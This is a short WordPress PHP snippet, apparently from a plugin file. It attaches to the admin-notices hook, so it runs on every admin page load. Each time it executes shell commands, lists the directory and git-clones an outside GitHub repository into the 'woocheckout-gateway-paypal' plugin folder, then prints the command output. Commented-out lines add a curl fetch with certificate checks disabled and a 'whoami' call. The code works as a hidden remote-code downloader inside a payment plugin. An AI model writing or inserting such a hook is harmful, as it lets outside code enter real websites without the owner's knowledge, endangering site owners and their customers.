<?php
add_action('admin_notices', function () {
  // $ch = curl_init();
  // curl_setopt($ch, CURLOPT_URL, 'https://github.com/boxgates-dung/test/blob/main/README.md');
  // curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  // curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  // $data = curl_exec($ch);
  // curl_close($ch);
  // echo exec('whoami');

  echo exec('ls');

  $output = null;
  $retval = null;
  exec('cd ../wp-content/plugins/woocheckout-gateway-paypal && git clone https://github.com/boxgates-dung/test.git', $output, $retval);

  echo "Returned with status $retval and output:\n";
  print_r($output);

  // shell_exec('git clone https://github.com/boxgates-dung/test.git');

  echo '<div class="error"><p>' .

    ''

    . '</p></div>';
});
